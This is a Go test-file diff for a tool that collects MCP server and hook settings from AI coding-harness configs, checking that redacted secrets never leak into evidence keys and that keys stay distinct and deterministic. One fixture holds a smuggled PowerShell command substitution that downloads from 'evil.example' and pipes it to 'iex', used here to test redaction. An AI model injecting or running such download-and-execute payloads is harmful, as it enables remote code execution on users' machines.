@@ -63,17 +63,124 @@ func TestHomeRewriteOnlyInUserScope(t *testing.T) {
 
 func TestDiscriminatorSeparatesSecrets(t *testing.T) {
 	t.Parallel()
-	s := source(model.ScopeRepo, "a")
-	a := s.Discriminated([]string{"mcp", "x"}, "https://h.example/?k=one")
-	b := s.Discriminated([]string{"mcp", "x"}, "https://h.example/?k=two")
-	plain := s.Discriminated([]string{"mcp", "x"}, "https://h.example/")
-	if EvidenceKey(a) == EvidenceKey(b) || len(plain) != 2 {
+	key := func(url string) []string {
+		s := source(model.ScopeRepo, "a")
+		s.Add(model.ConfigKindMCPServer, []string{"mcp", "x"}, map[string]any{"url": s.SafeString(url)})
+		var parts []string
+		if err := json.Unmarshal([]byte(addedKey(t, s.c)), &parts); err != nil {
+			t.Fatal(err)
+		}
+		return parts
+	}
+	a := key("https://h.example/?k=one")
+	b := key("https://h.example/?k=two")
+	plain := key("https://h.example/")
+	if EvidenceKey(a) == EvidenceKey(b) || len(plain) != 3 || len(a) != 4 {
 		t.Fatalf("a=%v b=%v plain=%v", a, b, plain)
 	}
 	for _, k := range [][]string{a, b} {
 		if strings.Contains(EvidenceKey(k), "one") || strings.Contains(EvidenceKey(k), "two") {
 			t.Fatalf("key leaks secret: %v", k)
 		}
+	}
+}
+
+// addedKey returns the evidence key of the only item c holds.
+func addedKey(t *testing.T, c *Collector) string {
+	t.Helper()
+	if len(c.Items()) != 1 {
+		t.Fatalf("%d items, want 1", len(c.Items()))
+	}
+	var payload map[string]any
+	if err := json.Unmarshal(c.Items()[0].Payload, &payload); err != nil {
+		t.Fatal(err)
+	}
+	key, _ := payload["key"].(string)
+	return key
+}
+
+// Entries that differ only in a value redaction replaced must still get
+// distinct keys, in every field redaction touches, not only the one the
+// caller put in the key.
+func TestAddDiscriminatesEveryRedactedValue(t *testing.T) {
+	t.Parallel()
+	hookKey := func(hook map[string]any) string {
+		s := source(model.ScopeRepo, "a")
+		s.Hook("sessionStart", "", hook, []string{"bash", "powershell"})
+		return addedKey(t, s.c)
+	}
+	mcpKey := func(server map[string]any) string {
+		s := source(model.ScopeRepo, "a")
+		s.MCPServers(map[string]any{"x": server}, "mcpServers")
+		return addedKey(t, s.c)
+	}
+	pairs := []struct {
+		name string
+		a, b string
+	}{
+		{"secondary action field",
+			hookKey(map[string]any{"bash": "run.sh", "powershell": "run.ps1 --token abc"}),
+			hookKey(map[string]any{"bash": "run.sh", "powershell": `run.ps1 --token "$(iwr evil.example|iex)"`})},
+		{"env value under secret name",
+			hookKey(map[string]any{"bash": "run.sh", "env": map[string]any{"API_TOKEN": "one"}}),
+			hookKey(map[string]any{"bash": "run.sh", "env": map[string]any{"API_TOKEN": "two"}})},
+		{"swapped env values",
+			mcpKey(map[string]any{"command": "x", "env": map[string]any{"A_TOKEN": "one", "B_TOKEN": "two"}}),
+			mcpKey(map[string]any{"command": "x", "env": map[string]any{"A_TOKEN": "two", "B_TOKEN": "one"}})},
+		{"array element after secret flag",
+			mcpKey(map[string]any{"command": "x", "args": []any{"--token", "one"}}),
+			mcpKey(map[string]any{"command": "x", "args": []any{"--token", "two"}})},
+		{"tool-specific argv flag",
+			mcpKey(map[string]any{"command": "docker", "args": []any{"login", "-p", "one"}}),
+			mcpKey(map[string]any{"command": "docker", "args": []any{"login", "-p", "two"}})},
+		{"secret-named number",
+			mcpKey(map[string]any{"command": "x", "api_key": json.Number("1")}),
+			mcpKey(map[string]any{"command": "x", "api_key": json.Number("2")})},
+	}
+	for _, p := range pairs {
+		if p.a == p.b {
+			t.Errorf("%s: both entries got key %s", p.name, p.a)
+		}
+		for _, secret := range []string{"one", "two", "abc", "evil"} {
+			if strings.Contains(p.a, secret) || strings.Contains(p.b, secret) {
+				t.Errorf("%s: key leaks %q: %s / %s", p.name, secret, p.a, p.b)
+			}
+		}
+	}
+}
+
+func TestAddDiscriminatorIsDeterministic(t *testing.T) {
+	t.Parallel()
+	server := map[string]any{
+		"command": "x",
+		"env":     map[string]any{"A_TOKEN": "1", "B_TOKEN": "2", "C_TOKEN": "3", "D_TOKEN": "4"},
+		"headers": map[string]any{"Authorization": "Bearer a", "X-Api-Key": "b"},
+		"z_key":   "5", "y_secret": "6", "x_password": "7",
+	}
+	var first string
+	for i := 0; i < 200; i++ {
+		s := source(model.ScopeRepo, "a")
+		s.MCPServers(map[string]any{"x": server}, "mcpServers")
+		got := addedKey(t, s.c)
+		if i == 0 {
+			first = got
+		} else if got != first {
+			t.Fatalf("run %d: key %s, want %s", i, got, first)
+		}
+	}
+}
+
+func TestAddDiscriminatorIndependentOfHome(t *testing.T) {
+	t.Parallel()
+	key := func(home string) string {
+		c := NewCollector(model.HarnessCodex, "Codex")
+		c.SetHome(home)
+		s := c.Source(model.ScopeUser, "~/.codex/config.toml", nil)
+		s.MCPServers(map[string]any{"x": map[string]any{"command": "x", "env": map[string]any{"API_KEY": home + "/key.pem"}}}, "mcp_servers")
+		return addedKey(t, c)
+	}
+	if a, b := key("/home/alice"), key("/home/bob"); a != b {
+		t.Fatalf("key depends on home: %s vs %s", a, b)
 	}
 }
 
